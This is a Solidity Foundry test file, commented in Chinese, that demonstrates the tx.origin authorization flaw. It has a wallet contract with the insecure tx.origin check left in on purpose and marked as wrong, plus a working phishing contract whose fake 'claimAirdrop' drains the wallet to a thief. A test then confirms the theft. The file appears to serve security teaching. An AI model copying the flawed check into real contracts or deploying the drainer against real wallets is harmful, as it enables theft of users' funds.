// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

/// 演示：用 tx.origin 做权限判断，会被钓鱼合约利用
contract TxOriginWallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transferTo(address payable to, uint256 amount) external {
        require(tx.origin == owner, "not owner"); // ❌ 应该用 msg.sender
        to.transfer(amount);
    }
}

/// 钓鱼合约：诱导钱包主人调用 claimAirdrop()
contract Phishing {
    TxOriginWallet immutable wallet;
    address payable immutable thief;

    constructor(TxOriginWallet w) {
        wallet = w;
        thief = payable(msg.sender);
    }

    function claimAirdrop() external {
        wallet.transferTo(thief, address(wallet).balance);
    }
}

contract TxOriginTest is Test {
    function test_PhishingViaTxOrigin() public {
        address victim = makeAddr("victim");
        address thief = makeAddr("thief");

        vm.deal(victim, 10 ether);
        vm.prank(victim);
        TxOriginWallet wallet = new TxOriginWallet{value: 10 ether}();

        vm.prank(thief);
        Phishing p = new Phishing(wallet);

        // 受害者以为在领空投
        vm.prank(victim, victim);
        p.claimAirdrop();

        assertEq(thief.balance, 10 ether);
    }
}
